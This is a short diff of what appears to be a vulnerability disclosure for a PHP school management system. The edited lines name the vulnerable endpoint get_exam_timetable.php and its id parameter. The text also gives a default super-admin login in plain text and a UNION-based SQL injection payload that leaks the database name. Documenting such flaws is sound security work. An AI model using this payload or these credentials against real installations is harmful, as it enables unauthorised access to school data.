@@ -4,9 +4,9 @@ Login account: suarez081119@gmail.com/12345 (Super Admin account)
 
 vendors: https://itsourcecode.com/free-projects/php-project/advanced-school-management-system-in-php-with-source-code/
 
-Vulnerability File: /school/model/get_exam_timetable.php?id=-
+Vulnerability File: /school/model/get_exam_timetable.php?id=
 
-Vulnerability location: /school/model/get_exam_timetable.php?id=-,id
+Vulnerability location: /school/model/get_exam_timetable.php?id=,id
 
 [+] Payload: /school/model/get_exam_timetable.php?id=-1%20union%20select%201,database(),3,4,5,6--+ // Leak place ---> id
 
